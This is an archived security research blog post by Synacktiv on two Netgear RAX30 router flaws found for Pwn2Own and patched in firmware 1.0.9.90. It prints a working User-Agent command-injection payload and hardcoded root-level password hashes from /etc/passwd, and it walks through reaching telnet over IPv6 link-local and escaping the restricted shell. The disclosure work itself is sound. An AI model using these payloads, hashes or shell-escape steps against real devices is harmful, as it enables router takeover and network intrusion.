---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-06_cool-vulns-dont-live-long-netgear-and-pwn2own.md
original_filename: 2022-12-06_cool-vulns-dont-live-long-netgear-and-pwn2own.md
title: Cool Vulns Don't Live Long - Netgear And Pwn2Own
category: documents
detected_topics:
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: 6b60e6dd002185b00c484bf8a93da3f70040993c6c7d4878334102d72ca2dac5
text_sha256: 1c4c5c666e7d5a26a5b6cdaa42ee7aef3bec88424e3a07c8a6ff853289f423be
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: true
---

# Cool Vulns Don't Live Long - Netgear And Pwn2Own

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-06_cool-vulns-dont-live-long-netgear-and-pwn2own.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: True
- Raw SHA256: `6b60e6dd002185b00c484bf8a93da3f70040993c6c7d4878334102d72ca2dac5`
- Text SHA256: `1c4c5c666e7d5a26a5b6cdaa42ee7aef3bec88424e3a07c8a6ff853289f423be`


## Content

---
title: "Cool Vulns Don't Live Long - Netgear And Pwn2Own"
page_title: "Cool vulns don't live long - Netgear and Pwn2Own"
url: "https://www.synacktiv.com/publications/cool-vulns-dont-live-long-netgear-and-pwn2own.html"
final_url: "https://www.synacktiv.com/publications/cool-vulns-dont-live-long-netgear-and-pwn2own.html"
authors: ["Kevin Denis"]
programs: ["Netgear"]
bugs: ["Code injection", "RCE", "Security code review"]
publication_date: "2022-12-06"
added_date: "2022-12-09"
source: "pentester.land/writeups.json"
original_index: 1808
---

# Cool vulns don't live long - Netgear and Pwn2Own

Rédigé par Kevin Denis \- 06/12/2022 - dans Exploit \- [Téléchargement](cool-vulns-dont-live-long-netgear-and-pwn2own#) __

Pwn2own is a competition where hackers try to execute arbitrary code on selected devices. This blogpost will describe two vulnerabilities found in the Netgear RAX30 router, and explain how both were patched the day before the event.

Vous souhaitez améliorer vos compétences ? Découvrez nos sessions de **formation** ! [En savoir plus](../offres/formations)

For this Pwn2Own edition, we chose to analyze the `Netgear Router RAX30`. The Netgear firmware version was the `1.0.7.78` at the time, and it can be downloaded on the [official website](https://www.netgear.com/support/product/RAX30#download). Once downloaded, all files can be extracted with the `binwalk` command. We end up with a pretty standard Linux kernel and filesystem.

## Analysis of the LAN bug

We begun by identifying files and services in the router by listing directories, and a binary immediately caught our eye:
  
  
  $ ls -1 squashfs-root/bin/
  (...)
  squashfs-root/bin/pudil
  squashfs-root/bin/pudilcb
  squashfs-root/bin/pufwUpgrade
  squashfs-root/bin/puhttpsniff            <--- This one
  squashfs-root/bin/pu_iQoS_db_update
  squashfs-root/bin/puraUpdate
  (...)

We can also see that this binary is started by default:
  
  
  mitsurugi@dojo$ grep -r puhttpsniff squashfs-root/
  squashfs-root/etc/rc3.d/S79dal_inited.sh:/bin/puhttpsniff
  mitsurugi@dojo$
  

A first analysis with `strings` reveals some juicy content:
  
  
  mitsurugi@dojo$ ls -l squashfs-root/bin/puhttpsniff
  -rwxr-xr-x 1 mitsurugi mitsurugi  4 sept. 21:24 squashfs-root/bin/puhttpsniff
  mitsurugi@dojo$ strings squashfs-root/bin/puhttpsniff
  /lib/ld-linux.so.3
  (...)
  User-Agent:
  %255[^
  pudil -i %s "%s"
  (...)
  iptables -w -t filter -D INPUT -i br0 -p tcp --dport 80 -j NFLOG --nflog-group 0 --nflog-size 512 2> /var/tmpDebug
  iptables -w -t filter -I INPUT -i br0 -p tcp --dport 80 -j NFLOG --nflog-group 0 --nflog-size 512
  iptables -w -t filter -D FORWARD -i br0 -p tcp --dport 80 -j NFLOG --nflog-group 0 --nflog-size 512 2> /var/tmpDebug
  iptables -w -t filter -I FORWARD -i br0 -p tcp --dport 80 -j NFLOG --nflog-group 0 --nflog-size 512
  HTTP sniffer start!!
  (...)
  mitsurugi@dojo$

With this snippet only, we can imagine the workflow. This binary inserts `NFLOG` `iptables` rules in order to run callbacks. The "User-Agent" strings leads us to understand what is searched, and the `pudil -i %s "%s"` line is quite interesting. Here is the decompiled part dealing with `User-Agent`:
  
  
  if ( data_len > 9 )
  {
  data[data_len] = 0;
  result = strstr(data, "User-Agent: ");
  if ( result )
  {
  _isoc99_sscanf(result + 12, "%255[^\r\n]", &user_agent_string);
  sprintf(v10, "pudil -i %s \"%s\"", ip_addr, (const char *)&user_agent_string);
  return (char *)system(v10);
  }
  }
  

The `NFLOG` target is triggered for `INPUT` and `FORWARD` chains. As the webadmin listens on the `br0` interface on port 80, we can just send data on the default IP address. Putting arbitraty data in a `User-Agent` header triggers a code injection:
  
  
  $ curl --user-agent "a\";/sbin/reboot;\"" http://192.168.1.1
  

Sending such a request makes the router reboot. That was quite a quick win for the LAN. We can inject 255 characters in the "User-Agent" string, which is enough to do anything we need to take-over the router, such as downloading a full featured `busybox`, and launch a reverse-shell.

## Analysis of the WAN bug

A DHCP server has been set up to give an IP for the Netgear WAN interface. With the help of the LAN bug, we have a shell on the router. We first started by listing processes and sockets and saw that `ssh` (TCP port 22), `telnet` (TCP port 23) and others are listening on both IPv4 **and** IPv6 interfaces.

A quick `nmap` from the WAN interface in IPv4 shows that all ports are closed. But an `nmap` on the IPv6 address shows open ports (!!). Here is a demo showing the scan on TCP port 23:
  
  
  mitsurugi@dojo$ nmap -6 -p 23 fe80::6ecd:d6ff:fe44:dd73%eth1
  Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-01 12:04 CET
  Nmap scan report for fe80::6ecd:d6ff:fe44:dd73
  Host is up (0.00061s latency).
  PORT  STATE  SERVICE
  23/tcp  open  telnet
  Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
  

`telnet` port is accessible from WAN side. This is a huge flaw. Although some `ip6tables` rules are defined to restrict accesses, they are only applied to the `br0` interface (the LAN one), and for the WAN interface only if a public IPv6 address is provided. If only a link-local address is in use on the WAN interface, rules are not applied, so anyone on the same network segment than the Netgear can query the IPv6 link-local address to connect to the services, including `webadmin`, `telnet`, `ssh`, `soap_serverd`, and so on.

The previous vulnerability in the router allows us to find an hardcoded account in the `/etc/passwd` file:
  
  
  mitsurugi@dojo$ cat /etc/passwd
  admin:<admin passwd hash>:0:0:Administrator:/:/bin/sh
  support:$1$QkcawmV.$VU4maCah6eHihce5l4YCP0:0:0:Technical Support:/:/bin/sh
  user:$1$9RZrTDt7$UAaEbCkq.Qa4u0QwXpzln/:0:0:Normal User:/:/bin/sh
  nobody:<admin passwd hash>:0:0:nobody for ftp:/:/bin/sh
  mitsurugi@dojo$

Cracking "support" account's password is left as an exercise for the reader (less than a second using [John the Ripper](https://github.com/openwall/john)). One can also notice that "support" account holds `uid 0`. Connecting to the router through `telnet` with the "support" account grants access to a restricted shell:
  
  
  $ telnet fe80::6ecd:d6ff:fe44:dd73%eth1
  Trying fe80::6ecd:d6ff:fe44:dd73%eth1...
  Connected to fe80::6ecd:d6ff:fe44:dd73%eth1.
  Escape character is '^]'.
  BCM96750 Broadband Router
  Login: support
  Password=***REDACTED*** help
  ?
  help
  logout
  exit
  quit
  reboot
  brctl
  cat
  (...)
  

Escaping this restricted shell can be achieved in many ways. One can call subshells with `$(...)`, chain commands with a ';', or even call 'sh' (hidden command).
  
  
  > ifconfig a; /bin/ash
  ifconfig a ; /bin/ash
  ifconfig: a: error fetching interface information: Device not found
  
  BusyBox v1.31.1 (2022-05-11 10:37:23 CST) built-in shell (ash)
  
  Enter 'help' for a list of built-in commands.
  # uname -a
  Linux RAX30 4.19.151 #1 SMP PREEMPT Wed May 11 10:27:11 CST 2022 armv7l
  #
  

Knowing the MAC address of the WAN interface (by pinging it for example), one can deduce the IPv6 link-local address (RFC 4291 section 2.5.6 + Appendix A), launch the `telnet` command, connect and escape shell.

## The patch

The rules of the Pwn2Own contest are clear: all devices are up-to-date until draw. The draw takes place on the December 2nd. On November 30th, Netgear pushed a hotFix, version `1.0.9.90`. Both vulnerabilities were killed by this update.

The puhttsniff binary does not call `system()` anymore, but uses `execve()`, and there is no more command injection.
  
  
  argv[3] = ua_string;
  argv[0] = "pudil";
  argv[1] = "-i";
  argv[4] = 0;
  argv[2] = client_ip;
  execve("/bin/pudil", argv, 0);
  
  

The IPv6 firewall was setup also for the WAN interface, so IPv6 services are not accessible through link-local anymore.

## Conclusion

Playing Pwn2Own is a fun game, but having vulnerabilities killed the day before the contest is frustrating, "c'est la vie mon ami" (as french says). However, please update this router to version `1.0.9.90`, and remember that some contestants still have bugs for this Pwn2own target, so do not forget to check for future updates!

Finally, Synacktiv team still has entries in the printers category, can't wait to watch them pop shells! GL, HF!

Partagez cet article
